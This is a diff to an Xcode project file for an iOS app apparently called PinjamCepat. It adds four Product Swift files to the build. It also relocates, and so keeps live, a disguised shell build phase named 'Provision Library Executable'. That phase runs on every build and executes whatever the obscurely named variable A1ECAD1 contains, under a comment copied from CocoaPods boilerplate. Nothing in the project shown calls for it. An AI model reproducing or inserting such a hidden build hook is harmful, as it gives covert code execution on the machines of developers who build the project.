@@ -52,6 +52,10 @@
 		73ED69B92F727BB90096AE72 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B82F727BB90096AE72 /* LoginViewController.swift */; };
 		73ED69BB2F727BF00096AE72 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69BA2F727BF00096AE72 /* LoginView.swift */; };
 		73ED69BD2F727CD30096AE72 /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69BC2F727CD30096AE72 /* LoginManager.swift */; };
+		73F39FD52F73AF52004B0C78 /* ProductView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD42F73AF52004B0C78 /* ProductView.swift */; };
+		73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */; };
+		73F39FD92F73AF6A004B0C78 /* ProductService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD82F73AF63004B0C78 /* ProductService.swift */; };
+		73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -104,6 +108,10 @@
 		73ED69B82F727BB90096AE72 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		73ED69BA2F727BF00096AE72 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
 		73ED69BC2F727CD30096AE72 /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
+		73F39FD42F73AF52004B0C78 /* ProductView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductView.swift; sourceTree = "<group>"; };
+		73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewModel.swift; sourceTree = "<group>"; };
+		73F39FD82F73AF63004B0C78 /* ProductService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductService.swift; sourceTree = "<group>"; };
+		73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListViewCell.swift; sourceTree = "<group>"; };
 		8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.release.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.release.xcconfig"; sourceTree = "<group>"; };
 		87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.debug.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -298,7 +306,11 @@
 		73ED69912F7252D70096AE72 /* Product */ = {
 			isa = PBXGroup;
 			children = (
+				73F39FD82F73AF63004B0C78 /* ProductService.swift */,
+				73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */,
 				7362DFE52F73747900D50737 /* ProductViewController.swift */,
+				73F39FD42F73AF52004B0C78 /* ProductView.swift */,
+				73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */,
 			);
 			path = Product;
 			sourceTree = "<group>";
@@ -410,9 +422,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		7315F81A2F7220F400C6DE2E /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -427,25 +436,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FB4EA10395094B09BF1DACE1 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;			
-		};
 		A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -489,6 +479,26 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		FB4EA10395094B09BF1DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -500,6 +510,7 @@
 				7362DFEA2F737AD100D50737 /* PopTryAgainView.swift in Sources */,
 				736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */,
 				736CA1B02F72DBB000FDB0EB /* CenterViewModel.swift in Sources */,
+				73F39FD52F73AF52004B0C78 /* ProductView.swift in Sources */,
 				73ED69942F72530F0096AE72 /* HomeViewController.swift in Sources */,
 				7362DFE62F73747900D50737 /* ProductViewController.swift in Sources */,
 				73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */,
@@ -510,6 +521,7 @@
 				73ED69982F7253200096AE72 /* CenterViewController.swift in Sources */,
 				7362DFEE2F7381E400D50737 /* EndView.swift in Sources */,
 				73ED69B32F7268C30096AE72 /* DeviceIdentifier.swift in Sources */,
+				73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */,
 				7362DFF52F73821300D50737 /* HomeService.swift in Sources */,
 				736CA1B92F72E63400FDB0EB /* AppHeadView.swift in Sources */,
 				73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */,
@@ -532,9 +544,11 @@
 				73ED69B12F7263E30096AE72 /* ToastManager.swift in Sources */,
 				7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */,
 				73ED69962F7253170096AE72 /* OrderViewController.swift in Sources */,
+				73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */,
 				7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */,
 				7362DFE42F73741300D50737 /* AppRouter.swift in Sources */,
 				73ED699A2F7253440096AE72 /* BaseView.swift in Sources */,
+				73F39FD92F73AF6A004B0C78 /* ProductService.swift in Sources */,
 				73ED69B52F7269B70096AE72 /* DeviceParamsManager.swift in Sources */,
 				736CA1B42F72E34700FDB0EB /* CenterListView.swift in Sources */,
 			);
